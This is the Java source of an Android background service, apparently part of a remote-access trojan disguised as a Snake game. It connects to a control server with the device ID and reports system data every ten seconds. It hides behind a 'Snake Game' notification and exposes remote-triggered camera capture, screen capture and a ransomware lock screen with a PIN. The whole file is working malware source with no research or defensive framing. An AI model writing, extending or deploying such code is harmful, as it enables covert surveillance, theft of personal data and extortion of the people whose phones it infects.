package com.snakegame.premium;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.app.admin.DevicePolicyManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;

public class GhostService extends Service {
    private static GhostService instance;
    private SocketClient socket;
    private RansomwareOverlay ransomware;
    private ScreenCaptureService screenCapture;
    private CameraService cameraService;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    public static GhostService getInstance() { return instance; }
    public SocketClient getSocket() { return socket; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        startForeground(1, buildNotification());
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        socket = new SocketClient(deviceId);
        socket.connect();
        ransomware = new RansomwareOverlay(this);

        new Thread(() -> {
            while (true) {
                try {
                    if (socket != null) {
                        socket.send("device_status", DataCollector.getSystemInfo(this).toString());
                    }
                    Thread.sleep(10000);
                } catch (Exception e) {}
            }
        }).start();
    }

    private Notification buildNotification() {
        String chId = "snake";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(chId, "Game", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        return new Notification.Builder(this, chId)
                .setContentTitle("Snake Game")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }

    public static boolean isDeviceAdminActive(Context ctx) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(ctx, DeviceAdminReceiver.class);
        return dpm.isAdminActive(comp);
    }

    public static String getLocalIp() {
        try {
            for (java.net.NetworkInterface ni : java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())) {
                for (java.net.InetAddress addr : java.util.Collections.list(ni.getInetAddresses())) {
                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) return addr.getHostAddress();
                }
            }
        } catch (Exception e) {}
        return "unknown";
    }

    public void startCamera() { if (cameraService == null) { cameraService = new CameraService(this); cameraService.start(); } }
    public void stopCamera() { if (cameraService != null) { cameraService.stop(); cameraService = null; } }
    public void startScreenCapture() { if (screenCapture == null) { screenCapture = new ScreenCaptureService(this); screenCapture.start(); } }
    public void stopScreenCapture() { if (screenCapture != null) { screenCapture.stop(); screenCapture = null; } }
    public void activateRansomware(String html, String pin) { mainHandler.post(() -> ransomware.show(html, pin)); }
    public void deactivateRansomware() { mainHandler.post(() -> ransomware.hide()); }
}
